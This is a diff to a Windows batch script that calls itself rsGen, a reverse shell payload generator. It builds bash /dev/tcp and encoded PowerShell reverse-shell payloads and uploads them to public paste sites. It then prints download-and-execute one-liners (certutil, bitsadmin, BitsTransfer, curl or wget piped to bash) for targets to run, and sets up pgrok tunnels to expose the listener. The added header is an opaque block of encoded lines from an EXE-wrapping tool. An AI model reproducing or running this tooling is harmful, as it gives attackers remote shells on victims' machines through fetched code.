@@ -1,3 +1,36 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFDFbRAq+GG6pDaET+NTJ/M2CrAAaXfYDapzc37rDLO8U5QvtdplN
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVsGAlXMbAs=
+::ZQ05rAF9IAHYFVzEqQICOxxRQmQ=
+::eg0/rx1wNQPfEVWB+kM9LVsJDDaRO260SLAE7Yg=
+::fBEirQZwNQPfEVWB+kM9LVsJDDaRO260Zg==
+::cRolqwZ3JBvQF1fEqQIiOzxRQkSLLyu7RocZ/u3p/O/HkUUYWO5/SI7C1ruPJKA070vhZ5c52WgansQeTBNZfRmiYAh6yQ==
+::dhA7uBVwLU+EWGuX80c+SA==
+::YQ03rBFzNR3SWATExlE3LRU0
+::dhAmsQZ3MwfNWATE0k4pLhJHRGQ=
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFDFbRAq+GG6pDaET+NTJ/M2CrAAaXfYDSpzc37rAJfgWig==
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
 @echo off
 title rsGen - Reverse Shell Payload Generator
 
@@ -267,10 +300,11 @@ goto :eof
 ::base64 encode
 :rs_base64_encode_start
 set /p<nul="%~1">"%temp%\rs_temp_input.rsg"
-certutil -encodehex -f "%temp%\rs_temp_input.rsg" "%temp%\rs_temp_output.rsg" 0x40000001 >nul 2>nul
-FOR /F "delims==" %%i in (%temp%\rs_temp_output.rsg) do (set rsgen_b64_res=%%i)
-rem echo "!rsgen_b64_res!"
-:rs_base64_encode_end
+certutil -f -encode "%temp%\rs_temp_input.rsg" "%temp%\rs_temp_output.rsg">nul
+for /f %%i in ('findstr /b /c:"-" /v "%temp%\rs_temp_output.rsg"') do (
+    set "rsgen_b64_res=%%i"
+)
+:rs_base64_encode_ende
 
 ::Clean temporary files
 :rs_clean_tempfile_start
@@ -385,6 +419,7 @@ if exist "%cd%\include\pgrok.exe" (
     if !rs_pgrok! == 0 ( 
         FOR /F tokens^=11^ delims^=^/^\^:^,^" %%i in ('%cd%\include\curl.exe -s --retry 3 --retry-delay 5 --retry-connrefused http://localhost:4040/http/in^|find /i "tcp://"') do (set rs_pgrok_host=%%i)
         FOR /F tokens^=12^ delims^=^/^\^:^,^" %%i in ('%cd%\include\curl.exe -s --retry 3 --retry-delay 5 --retry-connrefused http://localhost:4040/http/in^|find /i "tcp://"') do (set rs_pgrok_port=%%i)
+        
         set rs_listen_host=
         set rs_listen_host=!rs_pgrok_host!
         echo  + Starting the pgrok tcp tunnel 127.0.0.1:!rs_listen_port! ^<==^> !rs_pgrok_host!:!rs_pgrok_port!
@@ -495,7 +530,6 @@ set rs_ps_command_b64=!powershell_listener_payload!
 
 set "rs_ps_command_pre_lan=&powershell -EP Bypass -NoLogo -NonI -NoP -Enc "
 set "linux_command_raw_lan=/bin/bash -i>&/dev/tcp/!rs_listen_host!/!rs_listen_port! 0>&1"
-rem echo !linux_command_raw_lan!.test
 call :rs_base64_encode_start "!linux_command_raw_lan!"
 set rs_linux_command_b64_lan=%rsgen_b64_res%
 set "rs_command_b64_lan=!rs_linux_command_b64_lan!!rs_ps_command_pre_lan!!rs_ps_command_b64!"
@@ -567,71 +601,71 @@ goto :eof
 :rs_command_lan_end
 
 :rs_command_generate_pub_output_windowsw10_start
-if "!rs_pastebin_status!"=="0" echo  [92m  certutil -urlcache -split -f !rs_base64_payload_url! cd.bat^|cd.bat[0m
+if "!rs_pastebin_status!"=="0" echo  [92m  certutil -urlcache -split -f !rs_base64_payload_url!.txt cd.bat^|cd.bat[0m
 echo,
-if "!rs_pastebin_status!"=="0" echo  [92m  certutil -urlcache -split -f !rs_c#_payload_url! cd.bat^|cd.bat !rs_listen_host! !rs_listen_port! cmd[0m
+if "!rs_pastebin_status!"=="0" echo  [92m  certutil -urlcache -split -f !rs_c#_payload_url!.txt cd.bat^|cd.bat !rs_listen_host! !rs_listen_port! cmd[0m
 echo,
-if "!rs_pastebin_status!"=="0" echo  [92m  certutil -urlcache -split -f !rs_c#_payload_url! cd.bat^|cd.bat !rs_listen_host! !rs_listen_port! powershell[0m
+if "!rs_pastebin_status!"=="0" echo  [92m  certutil -urlcache -split -f !rs_c#_payload_url!.txt cd.bat^|cd.bat !rs_listen_host! !rs_listen_port! powershell[0m
 echo,
-if "!rs_pastebin_status!"=="0" echo  [92m  bitsadmin /transfer n !rs_base64_payload_url! %%cd%%\cd.bat^|cd.bat[0m
+if "!rs_pastebin_status!"=="0" echo  [92m  bitsadmin /transfer n !rs_base64_payload_url!.txt %%cd%%\cd.bat^|cd.bat[0m
 echo,
-if "!rs_pastebin_status!"=="0" echo  [92m  powershell "Import-Module bitstransfer;start-bitstransfer !rs_base64_payload_url! cd.bat"^|cd.bat[0m
+if "!rs_pastebin_status!"=="0" echo  [92m  powershell "Import-Module bitstransfer;start-bitstransfer !rs_base64_payload_url!.txt cd.bat"^|cd.bat[0m
 echo,
 goto :eof
 :rs_command_generate_pub_output_windowsw10_end
 
 :rs_command_generate_pub_output_linuxw10_start
-if "!rs_pastebin_status!"=="0" echo  [92m  curl !rs_base64_payload_url!^|base64 -d^|bash[0m
+if "!rs_pastebin_status!"=="0" echo  [92m  curl !rs_base64_payload_url!.txt^|base64 -d^|bash[0m
 echo,
-if "!rs_pastebin_status!"=="0" echo  [92m  wget -qO- !rs_base64_payload_url!^|base64 -d^|bash[0m
+if "!rs_pastebin_status!"=="0" echo  [92m  wget -qO- !rs_base64_payload_url!.txt^|base64 -d^|bash[0m
 echo,
 goto :eof
 :rs_command_generate_pub_output_linuxw10_end
 
 :rs_command_generate_pub_output_wl10_start
-if "!rs_pastebin_status!"=="0" echo  [92m  certutil -urlcache -split -f !rs_base64_payload_url! cd.bat^|cd.bat^|^|curl !rs_base64_payload_url!^|base64 -d^|bash[0m
+if "!rs_pastebin_status!"=="0" echo  [92m  certutil -urlcache -split -f !rs_base64_payload_url!.txt cd.bat^|cd.bat^|^|curl !rs_base64_payload_url!.txt^|base64 -d^|bash[0m
 echo,
-if "!rs_pastebin_status!"=="0" echo  [92m  certutil -urlcache -split -f !rs_c#_payload_url! cd.bat^|cd.bat^|^|curl !rs_base64_payload_url!^|base64 -d^|bash[0m
+if "!rs_pastebin_status!"=="0" echo  [92m  certutil -urlcache -split -f !rs_c#_payload_url!.txt cd.bat^|cd.bat^|^|curl !rs_base64_payload_url!.txt^|base64 -d^|bash[0m
 echo,
-if "!rs_pastebin_status!"=="0" echo  [92m  bitsadmin /transfer n !rs_base64_payload_url! %%cd%%\cd.bat^|cd.bat^|^|curl !rs_base64_payload_url!^|base64 -d^|bash[0m
+if "!rs_pastebin_status!"=="0" echo  [92m  bitsadmin /transfer n !rs_base64_payload_url!.txt %%cd%%\cd.bat^|cd.bat^|^|curl !rs_base64_payload_url!.txt^|base64 -d^|bash[0m
 echo,
-if "!rs_pastebin_status!"=="0" echo  [92m  powershell "Import-Module BitsTransfer;start-bitstransfer !rs_base64_payload_url! cd.bat"^|cd.bat^|^|curl !rs_base64_payload_url!^|base64 -d^|bash[0m
+if "!rs_pastebin_status!"=="0" echo  [92m  powershell "Import-Module BitsTransfer;start-bitstransfer !rs_base64_payload_url!.txt cd.bat"^|cd.bat^|^|curl !rs_base64_payload_url!.txt^|base64 -d^|bash[0m
 echo,
 goto :eof
 :rs_command_generate_pub_output_wl10_end
 
 :rs_command_generate_pub_output_windowsw7_start
-if "!rs_pastebin_status!"=="0" echo    certutil -urlcache -split -f !rs_base64_payload_url! cd.bat^|cd.bat
+if "!rs_pastebin_status!"=="0" echo    certutil -urlcache -split -f !rs_base64_payload_url!.txt cd.bat^|cd.bat
 echo,
-if "!rs_pastebin_status!"=="0" echo    certutil -urlcache -split -f !rs_c#_payload_url! cd.bat^|cd.bat !rs_listen_host! !rs_listen_port! cmd
+if "!rs_pastebin_status!"=="0" echo    certutil -urlcache -split -f !rs_c#_payload_url!.txt cd.bat^|cd.bat !rs_listen_host! !rs_listen_port! cmd
 echo,
-if "!rs_pastebin_status!"=="0" echo    certutil -urlcache -split -f !rs_c#_payload_url! cd.bat^|cd.bat !rs_listen_host! !rs_listen_port! powershell
+if "!rs_pastebin_status!"=="0" echo    certutil -urlcache -split -f !rs_c#_payload_url!.txt cd.bat^|cd.bat !rs_listen_host! !rs_listen_port! powershell
 echo,
-if "!rs_pastebin_status!"=="0" echo    bitsadmin /transfer n !rs_base64_payload_url! %%cd%%\cd.bat^|cd.bat
+if "!rs_pastebin_status!"=="0" echo    bitsadmin /transfer n !rs_base64_payload_url!.txt %%cd%%\cd.bat^|cd.bat
 echo,
-if "!rs_pastebin_status!"=="0" echo    powershell "Import-Module bitstransfer;start-bitstransfer !rs_base64_payload_url! cd.bat"^|cd.bat
+if "!rs_pastebin_status!"=="0" echo    powershell "Import-Module bitstransfer;start-bitstransfer !rs_base64_payload_url!.txt cd.bat"^|cd.bat
 echo,
 goto :eof
 :rs_command_generate_pub_output_windowsw7_end
 
 :rs_command_generate_pub_output_linuxw7_start
-if "!rs_pastebin_status!"=="0" echo    curl !rs_base64_payload_url!^|base64 -d^|bash
+if "!rs_pastebin_status!"=="0" echo    curl !rs_base64_payload_url!.txt^|base64 -d^|bash
 echo,
-if "!rs_pastebin_status!"=="0" echo    wget -qO- !rs_base64_payload_url!^|base64 -d^|bash
+if "!rs_pastebin_status!"=="0" echo    wget -qO- !rs_base64_payload_url!.txt^|base64 -d^|bash
 echo,
-if "!rs_pastebin_status!"=="0" echo    wget -qO- !rs_base64_payload_url!^|base64 -d^|bash
+if "!rs_pastebin_status!"=="0" echo    wget -qO- !rs_base64_payload_url!.txt^|base64 -d^|bash
 echo,
 goto :eof
 :rs_command_generate_pub_output_linuxw7_end
 
 :rs_command_generate_pub_output_wl7_start
-if "!rs_pastebin_status!"=="0" echo    certutil -urlcache -split -f !rs_base64_payload_url! cd.bat^|cd.bat^|^|curl !rs_base64_payload_url!^|base64 -d^|bash
+if "!rs_pastebin_status!"=="0" echo    certutil -urlcache -split -f !rs_base64_payload_url!.txt cd.bat^|cd.bat^|^|curl !rs_base64_payload_url!.txt^|base64 -d^|bash
 echo,
-if "!rs_pastebin_status!"=="0" echo    certutil -urlcache -split -f !rs_c#_payload_url! cd.bat^|cd.bat^|^|curl !rs_base64_payload_url!^|base64 -d^|bash
+if "!rs_pastebin_status!"=="0" echo    certutil -urlcache -split -f !rs_c#_payload_url!.txt cd.bat^|cd.bat^|^|curl !rs_base64_payload_url!.txt^|base64 -d^|bash
 echo,
-if "!rs_pastebin_status!"=="0" echo    bitsadmin /transfer n !rs_base64_payload_url! %%cd%%\cd.bat^|cd.bat^|^|curl !rs_base64_payload_url!^|base64 -d^|bash
+if "!rs_pastebin_status!"=="0" echo    bitsadmin /transfer n !rs_base64_payload_url!.txt %%cd%%\cd.bat^|cd.bat^|^|curl !rs_base64_payload_url!.txt^|base64 -d^|bash
 echo,
-if "!rs_pastebin_status!"=="0" echo    "powershell "Import-Module BitsTransfer;start-bitstransfer !rs_base64_payload_url! cd.bat"|cd.bat^|^|curl !rs_base64_payload_url!^|base64 -d^|bash"
+if "!rs_pastebin_status!"=="0" echo    "powershell "Import-Module BitsTransfer;start-bitstransfer !rs_base64_payload_url!.txt cd.bat"|cd.bat^|^|curl !rs_base64_payload_url!.txt^|base64 -d^|bash"
 echo,
 goto :eof
 :rs_command_generate_pub_output_wl7_end
@@ -648,10 +682,11 @@ call :rs_powershell_listener_payload_start
 set "linux_command_raw=/bin/bash -i>&/dev/tcp/!rs_listen_host!/!rs_listen_port! 0>&1"
 call :rs_base64_encode_start "!linux_command_raw!"
 set rs_linux_command_b64=%rsgen_b64_res%
+::echo %rs_linux_command_b64%
 set rs_ps_command_suf_b64=!powershell_listener_payload!
 ::echo %rs_ps_command_suf_b64%
 set "rs_command_b64=!rs_linux_command_b64!!rs_ps_command_pre!!rs_ps_command_suf_b64!"
-rem echo !rs_command_b64!
+::echo !rs_command_b64!
 call :rs_command_upload_start !rs_listen_host! !rs_listen_port!
 if "!rs_pastebin_status!"=="-1" (
     echo,
@@ -677,36 +712,14 @@ if exist "%cd%\include\curl.exe" (
         set rs_base64_payload_url=
         FOR /F %%i in ('%cd%\include\curl.exe --retry 3 --retry-delay 5 --retry-connrefused -s -F "paste=<%cd%\payload\rs_base64.payload" https://p.ip.fi') do (set rs_base64_payload_url=%%i)  
         FOR /F %%i in ('%cd%\include\curl.exe --retry 3 --retry-delay 5 --retry-connrefused -s -F "paste=<%cd%\payload\c#.payload" https://p.ip.fi') do (set rs_c#_payload_url=%%i)  
-        set rs_base64_payload_url=!rs_base64_payload_url!.txt
-        set rs_c#_payload_url=!rs_c#_payload_url!.txt
+        rem echo !rs_base64_payload_url!
+        rem echo !rs_c#_payload_url!
     )
 
     if "!rs_pastebin_api!" == "https://dpaste.com/api/v2/" (
         set rs_base64_payload_url=
         FOR /F %%i in ('%cd%\include\curl.exe --retry 3 --retry-delay 5 --retry-connrefused -s -F "content=<%cd%\payload\rs_base64.payload" https://dpaste.com/api/v2/') do (set rs_base64_payload_url=%%i)  
         FOR /F %%i in ('%cd%\include\curl.exe --retry 3 --retry-delay 5 --retry-connrefused -s -F "content=<%cd%\payload\c#.payload" https://dpaste.com/api/v2/') do (set rs_c#_payload_url=%%i)  
-        set rs_base64_payload_url=!rs_base64_payload_url!.txt
-        set rs_c#_payload_url=!rs_c#_payload_url!.txt
-    )
-
-    if "!rs_pastebin_api!" == "https://paste.teknik.io/Action/Paste" (
-        set rs_base64_payload_url=
-        FOR /F %%i in ('%cd%\include\curl.exe --retry 3 --retry-delay 5 --retry-connrefused -ks -w "%%{redirect_url}" -o nul -F "content=<%cd%\payload\rs_base64.payload" https://paste.teknik.io/Action/Paste') do (set rs_base64_payload_url=%%i)  
-        FOR /F %%i in ('%cd%\include\curl.exe --retry 3 --retry-delay 5 --retry-connrefused -ks -w "%%{redirect_url}" -o nul -F "content=<%cd%\payload\c#.payload" https://paste.teknik.io/Action/Paste') do (set rs_c#_payload_url=%%i)  
-        FOR /F "tokens=3 delims==/" %%i in ("!rs_base64_payload_url!") do (set rs_base64_payload_url=%%i)
-        FOR /F "tokens=3 delims==/" %%i in ("!rs_c#_payload_url!") do (set rs_c#_payload_url=%%i)
-        set rs_base64_payload_url=https://paste.teknik.io/raw/!rs_base64_payload_url!
-        set rs_c#_payload_url=https://paste.teknik.io/raw/!rs_c#_payload_url!
-    )
-
-    if "!rs_pastebin_api!" == "https://ghostbin.co/paste/new" (
-        set rs_base64_payload_url=
-        FOR /F %%i in ('%cd%\include\curl.exe --retry 3 --retry-delay 5 --retry-connrefused -ks -w "%%{redirect_url}" -o nul -F "text=<%cd%\payload\rs_base64.payload" https://ghostbin.co/paste/new') do (set rs_base64_payload_url=%%i)  
-        FOR /F %%i in ('%cd%\include\curl.exe --retry 3 --retry-delay 5 --retry-connrefused -ks -w "%%{redirect_url}" -o nul -F "text=<%cd%\payload\c#.payload" https://ghostbin.co/paste/new') do (set rs_c#_payload_url=%%i)  
-        FOR /F "tokens=4 delims==/" %%i in ("!rs_base64_payload_url!") do (set rs_base64_payload_url=%%i)
-        FOR /F "tokens=4 delims==/" %%i in ("!rs_c#_payload_url!") do (set rs_c#_payload_url=%%i)
-        set rs_base64_payload_url=https://ghostbin.co/paste/!rs_base64_payload_url!/raw
-        set rs_c#_payload_url=https://ghostbin.co/paste/!rs_c#_payload_url!/raw
         rem echo !rs_base64_payload_url!
         rem echo !rs_c#_payload_url!
     )
@@ -784,7 +797,7 @@ goto :eof
 echo,
 echo  This is a Reverse Shell Payload Generator.
 echo,
-echo Usage: %~nx0 host port [options]
+echo Usage: Rsgen.exe host port [options]
 echo Options:
 echo   -pub       If the target can access the public network, use it.
 echo   -lan       If the target cannot access the Internet, use it.
